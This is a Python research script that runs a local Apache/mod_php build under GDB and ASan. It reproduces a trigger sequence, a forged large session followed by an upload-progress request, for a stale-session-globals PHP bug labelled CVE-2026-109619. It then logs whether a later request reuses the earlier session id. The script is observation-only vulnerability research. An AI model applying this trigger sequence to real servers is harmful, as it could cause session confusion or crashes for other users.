#!/usr/bin/env python3
"""GDB instrumentation for CVE-2026-109619 Path B (stale PS globals, Apache mod_php).

Sequence (single httpd -X process under gdb):
  warm-up requests (health, session roundtrip, clean progress upload)
  request A: 3MB forged session + file part + progress -> FILE_START early
             session init, then OOM fatal mid-parse (END/RSHUTDOWN skipped)
  request B: session-id + progress fields, NO file part -> END cleanup calls
             php_session_initialize() on the stale PS() state.

Breakpoint checklist (plan 9.14-5b):
  (1) php_request_shutdown        -> print PG(modules_activated) per request
  (2) php_rshutdown_session_globals (session.c:137) -> mark per request
      expected: warm-ups call it, request A does NOT, request B does (from END)
  (3) php_session_rfc1867_cleanup -> print PS(id)/PS(mod_data) pointers and
      the session id string; request B must still carry request A's id.

Observation only: no exploitation attempt, no heap grooming.
"""
import argparse
import http.cookiejar
import json
import os
import secrets
import signal
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from probe import multipart  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
BASE = Path('/home/phplab/php-lab')
PORT = 18088
SESSION_FIELD = 'PHPSESSID'
PROGRESS_FIELD = 'PHP_SESSION_UPLOAD_PROGRESS'

GDB_TEMPLATE = '''set pagination off
set confirm off
set breakpoint pending on
add-auto-load-safe-path /home/phplab/php-lab
set environment LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libasan.so.8
set environment ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:log_path={asan}/asan
set environment ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer
set environment USE_ZEND_ALLOC=0
set environment USE_TRACKED_ALLOC=1

break php_request_shutdown
commands
  silent
  printf "MARK rq_shutdown modules_activated=%d\\n", core_globals.modules_activated
  continue
end

break session.c:137
commands
  silent
  printf "MARK session_globals_shutdown\\n"
  bt 3
  continue
end

break php_session_rfc1867_cleanup
commands
  silent
  printf "MARK rfc1867_cleanup ps_id_ptr=%p ps_mod_data=%p\\n", ps_globals.id, ps_globals.mod_data
  if ps_globals.id != 0
    x/s ((zend_string*)ps_globals.id)->val
  end
  continue
end

break php_session_initialize
commands
  silent
  printf "MARK session_init ps_id_ptr=%p ps_mod_data=%p\\n", ps_globals.id, ps_globals.mod_data
  if ps_globals.id != 0
    x/s ((zend_string*)ps_globals.id)->val
  end
  continue
end

file /usr/sbin/apache2
set args -X -f {conf}
run
'''


def health(port=PORT):
    try:
        with urllib.request.urlopen('http://127.0.0.1:%d/health' % port, timeout=3) as res:
            return json.load(res).get('ok') is True
    except Exception:
        return False


def parse_marks(log_text):
    """Per-request segments: marks between one rq_shutdown and the next belong
    to the request that closed with the latter; trailing marks (a request that
    never shut down, e.g. an aborted consumer) form the final segment."""
    requests = []
    current = None

    def ensure_current():
        nonlocal current
        if current is None:
            current = dict(shutdown_line='', modules_activated=None,
                           session_globals_shutdown=0, cleanup_marks=[], init_marks=[])

    for line in log_text.splitlines():
        if 'MARK rq_shutdown' in line:
            ensure_current()
            current['shutdown_line'] = line.strip()
            try:
                current['modules_activated'] = int(
                    line.split('modules_activated=')[1].split()[0])
            except (IndexError, ValueError):
                pass
            requests.append(current)
            current = None
        elif 'MARK session_globals_shutdown' in line:
            ensure_current()
            current['session_globals_shutdown'] += 1
        elif 'MARK rfc1867_cleanup' in line:
            ensure_current()
            current['cleanup_marks'].append(line.strip())
        elif 'MARK session_init' in line:
            ensure_current()
            current['init_marks'].append(line.strip())
    if current:
        requests.append(current)
    return requests


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--version', default='8.4.4')
    args = parser.parse_args()

    run = BASE / 'evidence' / ('apache-lab-%s-pathb-gdb' % args.version)
    prefix = BASE / 'install' / (args.version + '-apache')
    manifest_path = prefix / 'build-manifest.json'
    manifest = (json.loads(manifest_path.read_text()) if manifest_path.exists()
                else dict(prefix=str(prefix), note='build-manifest.json absent for this prefix'))
    stamp = time.strftime('%Y%m%dT%H%M%S', time.gmtime())
    out = BASE / 'evidence' / ('probe-gdb-pathb-%s-%s' % (stamp, args.version))
    out.mkdir(parents=True)

    # Generate conf/ini in a private run dir via apache-lab.sh, then take over
    # the launch ourselves under gdb.
    env = os.environ.copy()
    env.update(APACHE_LAB_PREFIX=str(prefix), APACHE_LAB_RUN=str(run))
    subprocess.run(['bash', str(REPO / 'linux/apache-lab.sh'), 'stop', str(PORT)],
                   env=env, capture_output=True)
    time.sleep(0.5)
    subprocess.run(['bash', str(REPO / 'linux/apache-lab.sh'), 'start', str(PORT)],
                   env=env, capture_output=True)
    time.sleep(0.5)
    subprocess.run(['bash', str(REPO / 'linux/apache-lab.sh'), 'stop', str(PORT)],
                   env=env, capture_output=True)
    time.sleep(0.5)
    (run / 'asan-archive').mkdir(parents=True, exist_ok=True)
    for stale in run.glob('asan.*'):
        stale.rename(run / 'asan-archive' / stale.name)

    (out / 'gdb.cmd').write_text(GDB_TEMPLATE.format(asan=out, conf=run / 'httpd.conf'))
    log_handle = (out / 'gdb.log').open('w')
    gdb = subprocess.Popen(['gdb', '-q', '-batch', '-x', str(out / 'gdb.cmd')],
                           stdout=log_handle, stderr=subprocess.STDOUT,
                           start_new_session=True)
    report = dict(scope='GDB Path B instrumentation; observation only',
                  build=manifest, version=args.version, evidence=str(out),
                  checks=[], marks=[], verdict={})

    def request_failed(name, exc):
        report['checks'].append(dict(name=name, error=str(exc)))

    try:
        deadline = time.time() + 60
        ready = False
        while time.time() < deadline:
            if gdb.poll() is not None:
                raise RuntimeError('gdb exited before httpd was ready')
            if health():
                ready = True
                break
            time.sleep(0.4)
        if not ready:
            raise RuntimeError('httpd startup timeout under gdb')
        report['steps'] = ['ready']

        # Warm-up identical to the ASAN arm.
        health()
        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        for _ in range(2):
            try:
                opener.open('http://127.0.0.1:%d/session' % PORT, timeout=3)
            except Exception:
                pass
        cookie_sid = next((c.value for c in jar if c.name == 'PHPSESSID'), None)
        multipart(PORT, '/upload', fields=[(PROGRESS_FIELD, 'pgW')],
                  file_spec=('file', 'w.bin', b'W' * (64 * 1024)), chunk_size=32768,
                  chunk_delay=0.02, cookie=('PHPSESSID=' + cookie_sid) if cookie_sid else None)
        report['steps'].append('warmup')

        sid_big = 'pgbig' + secrets.token_hex(8)
        sid_small = 'pgsmall' + secrets.token_hex(8)
        big = 'A' * (3 * 1024 * 1024)
        sessions = run / 'sessions'
        sessions.mkdir(parents=True, exist_ok=True)
        (sessions / ('sess_' + sid_big)).write_text('big|s:%d:"%s";' % (len(big), big))
        (sessions / ('sess_' + sid_small)).write_text('small|a:1:{i:0;i:7;}')

        # Request A: producer (identical to the proven Bug S shape).
        try:
            req_a = multipart(PORT, '/upload',
                              fields=[(SESSION_FIELD, sid_big), (PROGRESS_FIELD, 'pgA')],
                              file_spec=('file', 'a.bin', b'K' * 32768))
            report['checks'].append(dict(name='request_a', status=req_a['status']))
        except Exception as exc:
            request_failed('request_a', exc)
        report['steps'].append('producer_sent')
        time.sleep(0.5)
        # Request B: consumer, no file part.
        try:
            req_b = multipart(PORT, '/upload',
                              fields=[(SESSION_FIELD, sid_small), (PROGRESS_FIELD, 'pgB')],
                              file_spec=None)
            report['checks'].append(dict(name='request_b', status=req_b['status']))
        except Exception as exc:
            request_failed('request_b', exc)
        report['steps'].append('consumer_sent')
        time.sleep(1.0)
    finally:
        if gdb.poll() is None:
            os.killpg(gdb.pid, signal.SIGTERM)
            try:
                gdb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                os.killpg(gdb.pid, signal.SIGKILL)
                gdb.wait()
        log_handle.close()

    log_text = (out / 'gdb.log').read_text(errors='replace')
    (out / 'gdb.log.txt').write_text(log_text)
    marks = parse_marks(log_text)
    report['marks'] = marks
    asan_reports = sorted(str(p) for p in out.glob('asan.*') if p.is_file())
    report['asan_reports'] = asan_reports
    php_log = run / 'php-error.log'
    log_text_php = php_log.read_text(errors='replace') if php_log.exists() else ''
    report['oom_bailout_logged'] = 'Allowed memory size of' in log_text_php

    # The producer is the request whose shutdown ran with modules_activated=0.
    # A module-deactivation php_rshutdown_session_globals prints AFTER its own
    # rq_shutdown mark (it runs inside php_request_shutdown), so the skip check
    # scans from the producer's shutdown mark to the consumer's first cleanup.
    producer = [i for i, item in enumerate(marks) if item['modules_activated'] == 0]
    producer_index = producer[0] if producer else None
    consumer_index = producer_index + 1 if producer_index is not None else None
    consumer = marks[consumer_index] if consumer_index is not None and consumer_index < len(marks) else None
    lines = log_text.splitlines()
    prod_pos = next((i for i, line in enumerate(lines) if 'modules_activated=0' in line), None)
    cons_pos = next((i for i, line in enumerate(lines)
                     if prod_pos is not None and i > prod_pos
                     and 'MARK rfc1867_cleanup' in line), None)
    skipped_shutdown = bool(
        prod_pos is not None
        and not any('MARK session_globals_shutdown' in lines[i]
                    for i in range(prod_pos, cons_pos if cons_pos is not None else len(lines))))
    report['verdict'] = dict(
        producer_request_index=producer_index,
        producer_modules_activated=(marks[producer_index]['modules_activated']
                                    if producer_index is not None else None),
        producer_skipped_session_globals_shutdown=skipped_shutdown,
        consumer_index=consumer_index,
        consumer_cleanup_marks=(consumer['cleanup_marks'] if consumer else []),
        consumer_init_ps_id=(consumer['init_marks'][:1] if consumer else []),
        asan_report_count=len(asan_reports),
    )
    # x/s prints the id string after each mark; the forged sid appearing in the
    # log AFTER the producer's shutdown proves request B reused request A's id.
    report['verdict']['forged_sid_seen_after_producer'] = sid_big[:16] in log_text.split(
        'modules_activated=0', 1)[-1] if 'modules_activated=0' in log_text else False

    (out / 'result.json').write_text(json.dumps(report, indent=2))
    print(json.dumps({'evidence': report['evidence'], 'checks': report['checks'],
                      'verdict': report['verdict']}, indent=2))


if __name__ == '__main__':
    main()
